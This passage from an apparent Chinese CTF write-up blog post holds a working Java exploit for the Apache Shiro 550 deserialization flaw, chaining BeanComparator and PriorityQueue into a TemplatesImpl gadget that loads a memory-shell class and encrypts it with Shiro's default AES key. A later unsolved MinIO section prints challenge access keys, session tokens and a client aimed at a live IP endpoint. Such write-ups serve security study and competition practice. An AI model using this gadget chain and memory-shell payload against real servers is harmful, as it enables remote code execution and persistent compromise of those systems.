class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.pocs.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.javasec.utils.SerializeUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Templates obj = SerializeUtils.getTemplateByclass(&quot;E:\\CTFLearning\\Java\\JavaSec\\target\\classes\\com\\javasec\\memshell\\DynamicMemshell.class&quot;);</span></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">obj</span> <span class="operator">=</span> SerializeUtils.getTemplate1(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            ThreadGroup a = Thread.currentThread().getThreadGroup();\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            java.lang.reflect.Field v2 = a.getClass().getDeclaredField(\&quot;threads\&quot;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            v2.setAccessible(true);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            Thread[] o = (Thread[]) v2.get(a);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            for(int i = 0; i &lt; o.length; ++i) &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                Thread z = o[i];\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                if (z.getName().contains(\&quot;Boogipop\&quot;))&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    z.setName(z.getName()+\&quot;yv66vgAAADQAhAoAGgBJBwBKCgBLAEwJAAIATQoATgBPBwBQBwBRCgAHAEkKAAYAUgoAUwBUCAA+CgBLAFUKAFYAVwoAVgBYBwBZCABaCgAPAFsKAFwAXQcAXgoAEwBJCgATAF8KAEsAYAoAUwBhBwBiCgAYAGMHAGQBAAxEZWZpbmVMb2FkZXIBAAxJbm5lckNsYXNzZXMBABMkYXNzZXJ0aW9uc0Rpc2FibGVkAQABWgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAkTGNvbS9qYXZhc2VjL21lbXNoZWxsL011bHRpTWVtc2hlbGw7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveH\&quot;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    System.out.println(z.getName());\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// 为了能够继续走下去,priority的size必须大于等于2</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        SerializeUtils.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        SerializeUtils.setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = convertObjectToBytes(queue);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(bytes, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] convertObjectToBytes(Object obj) &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">boas</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(boas)) &#123;</span><br><span class="line">            ois.writeObject(obj);</span><br><span class="line">            <span class="keyword">return</span> boas.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">            ioe.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>不断的去拼贴payload，我不想复现了太几把累了。真傻比。</p>
<h1 id="minioday（unsolved）"><a href="#minioday（unsolved）" class="headerlink" title="minioday（unsolved）"></a>minioday（unsolved）</h1><p>不知道是不是minio的day呢？或者是一些我不知道的利用trick，给的点位很简单就是自更新RCE，但怎么获取管理员权限是个问题，给的Dockefifle给了我们一对key</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;version&quot;</span>:<span class="number">1</span>,<span class="string">&quot;credentials&quot;</span>:&#123;<span class="string">&quot;accessKey&quot;</span>:<span class="string">&quot;Vmd6q3aw2eOEmZ6l&quot;</span>,<span class="string">&quot;secretKey&quot;</span>:<span class="string">&quot;eeuG1b8vW15TPpaN1fP9funQJdDG5wQy&quot;</span>,<span class="string">&quot;sessionToken&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJWbWQ2cTNhdzJlT0VtWjZsIiwicGFyZW50IjoicndjdGYiLCJzYS1wb2xpY3kiOiJlbWJlZGRlZC1wb2xpY3kiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZLaUpkTENKU1pYTnZkWEpqWlNJNld5SmhjbTQ2WVhkek9uTXpPam82S2lKZGZWMTkifQ.ptjboEMwWhfvl16Jy1gVpinTN7CpFjpy1NKO50RKkjjwzZfvFw-a7-mQnyjFeekxGLqhfIiC6az2kfA1E_Z6qg&quot;</span>,<span class="string">&quot;expiration&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>,<span class="string">&quot;status&quot;</span>:<span class="string">&quot;on&quot;</span>,<span class="string">&quot;parentUser&quot;</span>:<span class="string">&quot;rwctf&quot;</span>&#125;,<span class="string">&quot;updatedAt&quot;</span>:<span class="string">&quot;2023-11-15T05:38:23.652266083Z&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package com.javasec.pocs.solutions.rwctf;</span><br><span class="line"></span><br><span class="line">import io.minio.MinioClient;</span><br><span class="line">import io.minio.credentials.StaticProvider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">minio</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span> &#123;</span><br><span class="line">        String ak=<span class="string">&quot;QBUDBMG8E1HI5QOLTWZL&quot;</span>;</span><br><span class="line">        String sk=<span class="string">&quot;xuPRHKjsfCLwWSXIWTROp5AKcxtgRmgVpyvAbcRV&quot;</span>;</span><br><span class="line">        String token=<span class="string">&quot;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJRQlVEQk1HOEUxSEk1UU9MVFdaTCIsImV4cCI6MTcwMDA2OTgzNSwicGFyZW50IjoicndjdGYifQ.E5ESAQL4Rsj1ZVUOD1p2hO9fPED1s4lbAcT6iPKgZSYKDgkDTVbRkU98mHKIqtKygWEAn0U8pgwcYltQF0Wh9A&quot;</span>;</span><br><span class="line">        StaticProvider staticProvider = <span class="keyword">new</span> StaticProvider(ak,sk,token);</span><br><span class="line">        String ENDPOINT = <span class="string">&quot;http://47.251.10.169:33304/&quot;</span>;</span><br><span class="line">        MinioClient minioClient = MinioClient.builder().endpoint(ENDPOINT).credentialsProvider(staticProvider).build();</span><br><span class="line">        minioClient.downloadObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706460936638-5078de54-c674-4d97-b6e1-a1bb95488003.png#averageHue=%23565a62&clientId=u42b260bc-d6c4-4&from=paste&id=u501f5143&originHeight=99&originWidth=1465&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u812b8623-34e9-471b-91bc-ed0ed11e886&title="><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706460944655-d80a06bf-da2b-4505-ad36-1d6bd7cdf909.png#averageHue=%23465e64&clientId=u42b260bc-d6c4-4&from=paste&id=ud999526b&originHeight=61&originWidth=576&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=uda0037c5-9415-4605-8284-14c5ace0110&title="><br>但是所给的用户是一个低权限用户，只可以管理bucket，并不可以用amdin的update完成RCE。所以到这里就没什么思路了</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2024/02/02/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20Deserialization%2001/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">【.NET 安全】ASP.NET Deserialization 01</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2024/01/18/2024%E5%B9%B4%E5%B9%B4%E5%88%9D%E5%B1%95%E6%9C%9B/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">2024 年初展望</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>